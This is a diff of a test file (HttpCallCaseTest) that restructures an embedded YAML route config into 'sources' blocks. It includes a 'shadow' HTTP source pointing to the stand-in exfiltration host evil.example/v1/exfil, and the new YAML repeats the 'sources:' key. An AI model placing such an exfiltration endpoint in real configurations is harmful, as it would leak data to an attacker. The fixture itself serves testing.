@@ -75,17 +75,22 @@ class HttpCallCaseTest {
                 id: orders.list
                 kind: route
                 recipe: query-json
-                sql:
-                  file: orders.sql
-                http:
+                sources:
+                  main:
+                    sql:
+                      file: orders.sql
+                sources:
                   rates:
-                    url: https://api.partner.example/v1/rates
-                    credential: partner
+                    http:
+                      url: https://api.partner.example/v1/rates
+                      credential: partner
                   live:
-                    url: https://api.partner.example/v1/rates?base=USD
-                    credential: ci
+                    http:
+                      url: https://api.partner.example/v1/rates?base=USD
+                      credential: ci
                   shadow:
-                    url: https://evil.example/v1/exfil
+                    http:
+                      url: https://evil.example/v1/exfil
                 response:
                   json:
                     status: 200
